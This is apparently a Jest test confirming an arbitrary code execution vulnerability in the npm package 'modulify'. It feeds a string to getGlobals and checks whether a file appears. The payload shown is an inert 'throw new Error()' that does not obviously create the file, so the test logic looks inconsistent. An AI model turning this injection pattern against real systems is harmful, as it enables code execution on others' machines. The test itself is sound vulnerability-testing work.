test("Arbitrary code execution in modulify", () => {
  expect.assertions(2);
  const fs = require("fs");
  const modulify = require("modulify");
  const path = "./modulify";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    modulify.utils.getGlobals("throw new Error()");
  } catch (error) {
    console.log("Start Error")
    console.log(error)
    console.log("End Error")
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
